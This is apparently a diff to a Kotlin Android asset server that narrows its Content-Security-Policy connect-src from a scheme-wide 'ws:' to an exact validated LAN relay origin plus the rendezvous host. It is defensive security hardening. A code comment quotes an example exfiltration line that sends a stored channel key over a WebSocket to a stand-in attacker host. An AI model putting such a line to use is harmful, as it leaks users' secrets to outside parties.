@@ -23,23 +23,53 @@ import javax.crypto.spec.SecretKeySpec
 import kotlin.concurrent.thread
 
 /**
+ * The one rendezvous host this build was compiled against, or null for a
+ * LAN-only build.
+ */
+private val RENDEZVOUS_HOST: String? = BuildConfig.RENDEZVOUS_URL
+    .takeIf { it.isNotBlank() }
+    ?.removePrefix("wss://")?.removePrefix("ws://")
+    ?.substringBefore('/')?.substringBefore('?')
+    ?.takeIf { it.isNotBlank() }
+
+/**
+ * A LAN relay address is only ever `ws://<private-ipv4>:<port>`. Anything else
+ * is not going into a CSP header: a stray space or newline in a source
+ * expression would truncate the policy, and a hostname we cannot vouch for
+ * would widen it.
+ */
+private val LAN_WS_RE = Regex("^ws://\\d{1,3}(\\.\\d{1,3}){3}:\\d{1,5}$")
+
+/**
+ * Placeholder in the bundled HTML's `<meta>` CSP, replaced at serve time with
+ * the same source list the header carries. If it ever ships unsubstituted — an
+ * asset opened straight off disk, say — it is an unknown source expression,
+ * which CSP treats as matching nothing. That fails closed.
+ */
+private const val CONNECT_SRC_TOKEN = "__TAWNY_CONNECT_SRC__"
+
+/**
  * `connect-src` for the pages this server hands out.
  *
- * It used to end in a blanket `https:`, which meant that if script injection
- * ever landed in the page, the channel key sitting in localStorage could be
- * posted to any host on the internet. The page only ever needs three things:
- * its own origin, the Monitor's relay on the LAN (a plain `ws:` on a private
- * address that changes with the network), and the one rendezvous host this
- * build was compiled against.
+ * It used to end in a blanket `https:`, and then in a blanket `ws:`. Dropping
+ * the first while keeping the second fixed nothing: `ws:` is a *scheme-wide*
+ * source, so `new WebSocket("ws://attacker.example/?k=" + key)` was allowed to
+ * every host on the internet, and the channel key sitting in localStorage was
+ * one injected script away from leaving the device. A scheme with no host is
+ * not a restriction.
+ *
+ * The page only ever dials two things, and both are known by the time it is
+ * served: the one rendezvous host compiled into the build, and the single relay
+ * this session actually uses — `ws://127.0.0.1:<port>` on the Monitor (its own
+ * relay, on a different port from `'self'`, so it needs naming) or
+ * `ws://<monitor-lan-ip>:<port>` on a Handheld, learned from the pairing QR.
+ * [AssetHttpServer.lanRelay] carries that address, so the policy names an exact
+ * origin instead of a scheme.
  */
-private val CONNECT_SRC: String = buildString {
-    append("'self' ws:")
-    val rv = BuildConfig.RENDEZVOUS_URL
-    if (rv.isNotBlank()) {
-        val host = rv.removePrefix("wss://").removePrefix("ws://")
-            .substringBefore('/').substringBefore('?')
-        if (host.isNotBlank()) { append(" wss://"); append(host); append(" https://"); append(host) }
-    }
+private fun connectSrc(lanRelay: String?): String = buildString {
+    append("'self'")
+    if (lanRelay != null) { append(' '); append(lanRelay) }
+    RENDEZVOUS_HOST?.let { append(" wss://"); append(it); append(" https://"); append(it) }
 }
 
 private fun firstFreePort(start: Int): Int {
@@ -58,6 +88,17 @@ private fun firstFreePort(start: Int): Int {
 class AssetHttpServer(private val ctx: Context, preferredPort: Int) {
 
     val port: Int
+
+    /**
+     * The exact LAN relay origin this session dials, or null before one is
+     * known. Set by [MainActivity.goLiveWith] before the WebView is pointed at
+     * this server, and named verbatim in the `connect-src` of every page and
+     * header it serves. A value that is not a plain `ws://<ipv4>:<port>` is
+     * refused rather than trusted into the policy.
+     */
+    @Volatile var lanRelay: String? = null
+        set(value) { field = value?.takeIf { LAN_WS_RE.matches(it) } }
+
     private val server: ServerSocket
     // Bounded, not newCachedThreadPool(): any other app on the device holding
     // INTERNET can open sockets to loopback, and an unbounded pool would let it
@@ -121,10 +162,23 @@ class AssetHttpServer(private val ctx: Context, preferredPort: Int) {
             send(out, 403, "text/plain", "forbidden".toByteArray()); return
         }
 
-        val body = try {
+        var body = try {
             ctx.assets.open(rel).use { it.readBytes() }
         } catch (e: Exception) {
             send(out, 404, "text/plain", "not found".toByteArray()); return
+        }
+        // The page carries its own <meta> CSP as defence in depth, but a static
+        // file cannot know the rendezvous host or this session's relay, so it
+        // used to fall back to `connect-src ... ws: wss: https:` — a policy so
+        // wide it granted back everything the header was busy withholding.
+        // Browsers enforce every delivered policy independently, so the loosest
+        // one is harmless in theory; in practice it was the policy that shipped
+        // to anyone serving these assets without the header. Substituting the
+        // real source list keeps the two in step from one definition.
+        if (rel.endsWith(".html")) {
+            body = String(body, Charsets.UTF_8)
+                .replace(CONNECT_SRC_TOKEN, connectSrc(lanRelay))
+                .toByteArray(Charsets.UTF_8)
         }
         send(out, 200, mime(path), body)
     }
@@ -185,7 +239,7 @@ class AssetHttpServer(private val ctx: Context, preferredPort: Int) {
             "Referrer-Policy: no-referrer\r\n" +
             "Content-Security-Policy: default-src 'none'; script-src 'self'; " +
             "style-src 'self'; img-src 'self' data: blob:; media-src 'self' blob:; " +
-            "font-src 'self'; manifest-src 'self'; connect-src $CONNECT_SRC; " +
+            "font-src 'self'; manifest-src 'self'; connect-src ${connectSrc(lanRelay)}; " +
             "base-uri 'none'; form-action 'none'; frame-ancestors 'none'\r\n" +
             "Connection: close\r\n\r\n"
         out.write(head.toByteArray(Charsets.US_ASCII))
